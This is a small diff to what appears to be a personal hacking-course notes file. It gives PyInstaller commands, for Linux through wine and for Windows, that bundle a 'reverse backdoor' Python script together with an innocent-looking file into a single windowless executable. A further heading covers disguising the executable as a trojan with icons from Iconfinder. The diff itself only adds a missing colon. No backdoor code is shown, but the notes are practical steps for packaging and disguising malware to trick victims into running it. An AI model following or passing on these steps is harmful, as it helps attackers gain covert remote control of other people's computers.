@@ -1,6 +1,6 @@
 To embedd backdoor with a file: 
 1. For linux: #wine /location_of_pyinstaller_in_linux.exe --add-data "location_of_file;." --onefile --noconsole location_of_reverse_backdoor.py
-2. Fo Windows #location_of_pyinstaller.exe --add-data "location_of_file;." location_of_backdoor.py --onefile --noconsole *#check*
+2. Fo Windows: #location_of_pyinstaller.exe --add-data "location_of_file;." location_of_backdoor.py --onefile --noconsole *#check*
 
 To change .exe to trojan extension:
 Iconfinder.com
